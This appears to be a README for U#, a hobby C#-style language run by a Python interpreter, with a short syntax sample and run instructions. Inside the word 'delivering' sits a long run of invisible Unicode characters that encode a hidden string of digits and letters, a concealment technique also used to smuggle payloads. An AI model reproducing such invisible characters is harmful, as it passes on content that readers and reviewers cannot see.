# U#
## Not to be confused with USharp (a plugin for C#)
U# is a programming language designed to mimic C# and its other derivatives. Unlike them, it's written in Python, making it significantly slower. 
Its drawbacks are that it was originally designed as esoteric (not anymore), but changed direction after the architecture was changed. 
It allows you to directly interact with Python itself (meaning you can write code in Python), with a little bit of C syntactic sugar mixed in. 
But okay, I won't repeat the mistakes I made in RANDG, namely:
- Making too many commits so you don't get inundated with them if you follow me (although I voluntarily asked you not to do this in my profile description)
- Making stupid mistakes in the code and then spending hours fixing them
- Promising a lot, but ultimately deliv󠄥󠄣󠄤󠄧󠄣󠄤󠄥󠄧󠄦󠄤󠄥󠄧󠄥󠄣󠄤󠄧󠄦󠅔󠅥󠅖󠅙󠅘󠅖󠅔󠅣󠅢󠄧󠄤󠄣󠄨󠄤󠄩󠄣󠅕󠅢󠅩󠅕󠅥󠅔󠅣󠅖󠅘󠅖󠅚󠅔󠅥󠄨󠄩󠄤󠄩󠄨󠄨󠄧󠅤󠄥󠄤󠅤󠅕󠅢󠅥󠅩󠅖󠅔󠅚󠅘󠅣󠅥󠅙󠅕󠅩󠅢󠄨󠄧󠄤󠄥󠅩󠄧󠄨󠄩󠄤󠄣󠅢󠅥󠅕󠅢󠅥󠅖󠅥󠅚󠅕󠅢󠄩󠄨󠄧󠅤󠄧󠄤󠄥󠄣󠄩󠄨󠅤󠄧󠄥󠄤󠄩󠄨󠄧󠅥󠅕󠅢󠅖󠅔󠅚󠅗󠅥󠅕󠄥󠅤󠄩󠄨󠄤󠅕󠄨󠅤󠅥󠅕󠅥󠅢󠅙󠅖󠅗󠅥󠅔󠅗󠄨󠅕󠅤󠄧󠄨󠄤󠄥󠅥󠅢󠅕󠅥ering nothing.

```
using re // P.S It now works, you can import python libraries and etc
printu("Hello, world!") // Hello, world!
print("Hello world _2!") // You can also use python in U#!
I_AM_XD // I am xd...
random_number
random_symbols
wait(2) // wait 2 seconds
terminal_command('echo hi', shell=True) // hi!
void Hello():
  print('Hello from function!')
Hello()
```

And that's all the syntax, I'll add more commands as I develop it, but don't expect much...

## So how do I run the code?

```
<your python version> <interpreter file path> <.usharp file path>
